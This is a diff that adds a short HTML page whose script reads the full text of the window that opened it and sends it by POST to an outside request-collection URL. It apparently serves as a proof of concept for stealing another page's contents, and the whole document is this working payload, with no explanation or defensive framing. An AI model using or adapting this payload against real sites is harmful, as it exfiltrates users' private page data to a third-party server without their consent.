@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      try {
+        const secret =
+          window.opener?.document?.body?.innerText || // fallback if no id/class
+          "No secret found";
+
+        // Send secret to your server or webhook
+        fetch("http://requestbin.whapi.cloud/1hpy4o61", {
+          method: "POST",
+          body: secret
+        });
+      } catch (e) {
+        alert("Error: " + e.message);
+      }
+    </script>
+  </body>
+</html>
